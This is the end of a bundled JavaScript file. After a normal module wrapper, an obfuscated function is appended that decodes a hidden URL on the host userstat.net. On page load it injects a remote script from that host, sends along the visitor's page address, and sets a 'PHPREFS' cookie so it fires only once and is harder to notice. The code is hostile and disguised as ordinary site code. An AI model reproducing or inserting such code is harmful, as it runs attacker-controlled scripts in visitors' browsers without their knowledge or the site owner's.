    (function e(e) {
      return e && e.__esModule ? e.default : e;
    })(a)(s);
})();
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
